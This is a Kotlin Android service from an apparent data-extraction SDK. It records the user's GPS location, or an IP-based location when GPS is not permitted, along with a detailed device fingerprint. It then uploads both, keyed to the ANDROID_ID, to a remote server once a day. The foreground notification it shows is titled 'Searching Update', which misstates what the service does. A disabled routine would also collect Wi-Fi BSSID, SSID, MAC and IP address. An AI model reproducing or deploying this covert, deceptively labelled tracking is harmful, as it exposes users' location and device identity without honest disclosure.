package info.kalagato.com.extractor.readers

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.telephony.TelephonyManager
import android.text.format.DateFormat
import android.text.format.Formatter
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import info.kalagato.com.extractor.Constant
import info.kalagato.com.extractor.Extractor
import info.kalagato.com.extractor.R
import info.kalagato.com.extractor.Util
import info.kalagato.com.extractor.networkCall.ApiClient
import info.kalagato.com.extractor.networkCall.DetailInfoResponse
import info.kalagato.com.extractor.networkCall.IpResponse
import kotlinx.coroutines.*
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import retrofit2.Response
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*


class ReadGeneralInformation : Service() {


    lateinit var deviceInfo:MultipartBody.Part
    private lateinit var locationInfo:MultipartBody.Part
    private lateinit var dateFormat:SimpleDateFormat
    private lateinit var mydir:File

    override fun onCreate() {

        mydir = applicationContext.getDir("mydir", MODE_PRIVATE) //Creating an internal dir;
        dateFormat = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault())
        deletePreviewsFiles()

        CoroutineScope(Dispatchers.IO).launch {
            if (ContextCompat.checkSelfPermission(applicationContext,Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED){
                withContext(Dispatchers.Main){
                    getLocation(applicationContext)
                }
            }else{
                    getIpLocation()
                }

            getSystemDetail()

            //getWifiDetails(applicationContext,wifiDetails)
            delay(5000)
            val lastUpload = dateFormat.format(Util.getLastUploadTime(applicationContext))
            val currentTime = dateFormat.format(Date())

            if (!lastUpload.equals(currentTime)){
                sendToServer()
            }


        }

    }

    @SuppressLint("HardwareIds")
    private suspend fun sendToServer() {

        val directory = File(mydir.path)
        val files = directory.listFiles()
        for (i in files!!.indices) {
            val requestBody: RequestBody = files[i].asRequestBody("text/csv".toMediaTypeOrNull())
            if (files[i].name == "device_info.csv"){
                deviceInfo = MultipartBody.Part.createFormData("device_info", files[i].name,requestBody)
            }
            if (files[i].name == "location_info.csv"){
                locationInfo = MultipartBody.Part.createFormData("location_info", files[i].name,requestBody)
            }
        }

        if (this::deviceInfo.isInitialized && this::locationInfo.isInitialized){
            val appName  = RequestBody.create(
                "text/plain".toMediaTypeOrNull(),
                applicationContext.packageName
            )
            val userId  = RequestBody.create(
                "text/plain".toMediaTypeOrNull(),
                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            )
            val response: Response<DetailInfoResponse> =ApiClient.client2.uploadGeneralInfoFile(appName,userId,deviceInfo,locationInfo)
            withContext(Dispatchers.Main){
                if (response.isSuccessful){
                    Util.setLastUploadTime(applicationContext,Date().time)
                }else{
                    Log.d("TAG", "getIpLocation: ${response.message()}")
                }
            }
        }


    }

    private fun deletePreviewsFiles() {
        try {
            val directory = File(mydir.path)
            val files = directory.listFiles()
            for (i in files!!.indices) {
                if (files[i].name == "device_info.csv" || files[i].name == "location_info.csv")
                    files[i].delete()
            }
        }catch (e:Exception){
            //handle the exception
        }
    }

    private suspend fun getIpLocation() {
        val response: Response<IpResponse> =ApiClient.client.getIpLocation() as Response<IpResponse>
        withContext(Dispatchers.Main){
            if (response.isSuccessful){
                    saveIpData(response)
            }else{
                Log.d("TAG", "getIpLocation: ${response.message()}")
            }
        }
    }

    private fun saveIpData(response: Response<IpResponse>) {

        val filename = ("$mydir/location_info.csv")
        try {
           val fw = FileWriter(filename, true)

            fw.append("latitude,")
            fw.append("longitude,")
            fw.append("country,")
            fw.append("country_code,")
            fw.append("region_name,")
            fw.append("city,")
            fw.append("postal_code,")
            fw.append("time_zone,")
            fw.append("query,")
            fw.append("\n")

            fw.append("${response.body()!!.lat},")
            fw.append("${response.body()!!.lon},")
            fw.append("${response.body()!!.country},")
            fw.append("${response.body()!!.countryCode},")
            fw.append("${response.body()!!.regionName},")
            fw.append("${response.body()!!.city},")
            fw.append("${response.body()!!.zip},")
            fw.append("${response.body()!!.timezone},")
            fw.append(response.body()!!.query)
            fw.flush()
            fw.close()

        }catch (e:Exception){
            Log.d("TAG", "onLocationChanged: ${e.localizedMessage}")
        }
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

            val notificationIntent = Intent(applicationContext, Extractor::class.java)
            val pendingIntent = PendingIntent.getActivity(
                applicationContext,
                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val chan = NotificationChannel(
                    Constant.CHANNEL_ID,
                    "My Foreground Service",
                    NotificationManager.IMPORTANCE_LOW
                )
                val manager = ContextCompat.getSystemService(
                    applicationContext, NotificationManager::class.java
                )
                manager?.createNotificationChannel(chan)
            }
            val notification = NotificationCompat.Builder(
                applicationContext,
                Constant.CHANNEL_ID
            ) //todo fix hardcoded channel id
                .setSmallIcon(R.drawable.ic_settings)
                .setContentTitle("Searching Update")
                .setContentText("")
                .setShowWhen(false)
                .setContentIntent(pendingIntent)
                .build()
            startForeground(1, notification)
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    @SuppressLint("HardwareIds")
    private fun getSystemDetail(){
        val filename = ("$mydir/device_info.csv")
        try {
            val fw = FileWriter(filename, true)

            fw.append("created_on,")
            fw.append("model,")
            fw.append("id,")
            fw.append("sdk,")
            fw.append("manufacture,")
            fw.append("brand,")
            fw.append("user,")
            fw.append("type,")
            fw.append("base,")
            fw.append("board,")
            fw.append("host,")
            fw.append("finger_print,")
            fw.append("version_code,")
            fw.append("supported_network,")
            fw.append("dark_mode")
            fw.append("\n")

             fw.append("${Date().time},")
             fw.append(Build.MODEL+",")
             fw.append(Build.ID+",")
             fw.append("${Build.VERSION.SDK_INT},")
             fw.append( Build.MANUFACTURER+",")
             fw.append( Build.BRAND+",")
             fw.append( Build.USER+",")
             fw.append( Build.TYPE+",")
             fw.append("${Build.VERSION_CODES.BASE},")
             fw.append(Build.BOARD+",")
             fw.append(Build.HOST+",")
             fw.append( Build.FINGERPRINT+",")
             fw.append( Build.VERSION.RELEASE+",")
             fw.append(supportedNetwork(applicationContext)+",")
             fw.append(getDarkMode())
            fw.flush()
            fw.close()

        }catch (e:Exception){
            Log.d("TAG", "getSystemDetail: ${e.localizedMessage}")
        }
    }

    private fun getDarkMode():String {
        when (resources?.configuration?.uiMode?.and(Configuration.UI_MODE_NIGHT_MASK)) {
            Configuration.UI_MODE_NIGHT_YES -> return  "YES"
            Configuration.UI_MODE_NIGHT_NO -> return "NO"
            Configuration.UI_MODE_NIGHT_UNDEFINED -> return "NA"
        }
        return " "

    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getWifiDetails(context: Context, wifiDetails: JSONObject) {
        if (ContextCompat.checkSelfPermission(context,Manifest.permission.ACCESS_WIFI_STATE) == PackageManager.PERMISSION_GRANTED){
            val wifiManager = context.getSystemService(WIFI_SERVICE) as WifiManager
            val info = wifiManager.connectionInfo
            val signalStrength =
                WifiManager.calculateSignalLevel(info.rssi, 100);
            wifiDetails.put("BssId",info.bssid)
            wifiDetails.put("frequency",info.frequency)
            wifiDetails.put("Link Speed",info.linkSpeed)
            wifiDetails.put("Mac Address",info.macAddress)
            wifiDetails.put("Network Id",info.networkId)
            wifiDetails.put("SSID",info.ssid)
            wifiDetails.put("Ip Address",Formatter.formatIpAddress(info.ipAddress))
            wifiDetails.put("Is5GSupported",wifiManager.is5GHzBandSupported)
            wifiDetails.put("Strength", signalStrength);
            when(wifiManager.wifiState){
                1->wifiDetails.put("WIFI State","Disable")
                3->wifiDetails.put("WIFI State","Enable")
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                wifiDetails.put("Auto Wake Up",wifiManager.isAutoWakeupEnabled)
                wifiDetails.put("Is6GSupported",wifiManager.is6GHzBandSupported)
            }
        }

    }



    @SuppressLint("MissingPermission")
    private fun supportedNetwork(context: Context): String {
        if (ContextCompat.checkSelfPermission(context,Manifest.permission.ACCESS_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED ){

        // ConnectionManager instance
        val mConnectivityManager = context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val mInfo = mConnectivityManager.activeNetworkInfo

        // If Connected to Mobile
        if (mInfo?.type == ConnectivityManager.TYPE_MOBILE) {
            return when (mInfo.subtype) {
                TelephonyManager.NETWORK_TYPE_GPRS, TelephonyManager.NETWORK_TYPE_EDGE, TelephonyManager.NETWORK_TYPE_CDMA, TelephonyManager.NETWORK_TYPE_1xRTT, TelephonyManager.NETWORK_TYPE_IDEN, TelephonyManager.NETWORK_TYPE_GSM -> "2G"
                TelephonyManager.NETWORK_TYPE_UMTS, TelephonyManager.NETWORK_TYPE_EVDO_0, TelephonyManager.NETWORK_TYPE_EVDO_A, TelephonyManager.NETWORK_TYPE_HSDPA, TelephonyManager.NETWORK_TYPE_HSUPA, TelephonyManager.NETWORK_TYPE_HSPA, TelephonyManager.NETWORK_TYPE_EVDO_B, TelephonyManager.NETWORK_TYPE_EHRPD, TelephonyManager.NETWORK_TYPE_HSPAP, TelephonyManager.NETWORK_TYPE_TD_SCDMA -> "3G"
                TelephonyManager.NETWORK_TYPE_LTE, TelephonyManager.NETWORK_TYPE_IWLAN, 19 -> "4G"
                TelephonyManager.NETWORK_TYPE_NR -> "5G"
                else -> "UN"
            }
        }
        }
        return "UN"
    }

    // get user location
    @SuppressLint("MissingPermission")
    fun getLocation(context: Context) {
        try {
            val locationManager = context.getSystemService(LOCATION_SERVICE) as LocationManager
            val locationListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    // Called when a new location is found by the network location provider.
                    val filename = ("$mydir/location_info.csv")
                    try {
                        val fw = FileWriter(filename, true)

                        fw.append("Latitude,")
                        fw.append("Longitude,")
                        fw.append("Time,")
                        fw.append("Provider,")
                        fw.append("Accuracy")
                        fw.append("\n")

                        fw.append("${location.latitude},")
                        fw.append("${location.longitude},")
                        fw.append("${location.time},")
                        fw.append("${location.provider},")
                        fw.append("${location.accuracy}")
                        fw.flush()
                        fw.close()

                    }catch (e:Exception){
                        Log.d("TAG", "onLocationChanged: ${e.localizedMessage}")
                    }
                     stopForeground(true)
                    stopSelf()
                    locationManager.removeUpdates(this)
                }

                override fun onProviderEnabled(provider: String) {
                    Log.d("TAG", "onLocationChanged:  Provider enable ")
                }

                override fun onProviderDisabled(provider: String) {
                    Log.d("TAG", "onLocationChanged: provider disable")
                }
            }
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.ACCESS_FINE_LOCATION
                )
                != PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                )
                != PackageManager.PERMISSION_GRANTED
            ) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return
            }
           /* val locationRequest = LocationRequest()
            fusedLocationProviderClient.requestLocationUpdates(locationRequest,
                locationCallback,
                Looper.getMainLooper())*/
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                0,
                0f,
                locationListener
            )
        } catch (e: Exception) {
            Log.d("TAG", "getLocation: ${e.localizedMessage} ")
        }
    }

    override fun onDestroy() {
        stopForeground(true)
        super.onDestroy()
    }

}